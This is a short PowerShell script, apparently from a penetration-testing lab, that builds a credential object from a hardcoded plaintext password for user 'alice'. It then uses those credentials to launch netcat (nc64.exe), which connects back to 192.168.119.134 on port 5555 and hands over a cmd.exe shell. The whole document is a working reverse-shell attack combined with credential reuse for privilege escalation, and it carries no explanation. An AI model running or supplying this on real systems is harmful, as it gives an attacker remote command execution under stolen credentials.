$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
$computer = "bethany"
[System.Diagnostics.Process]::Start("c:\HFS\nc64.exe","192.168.119.134 5555 -e c:\windows\system32\cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 
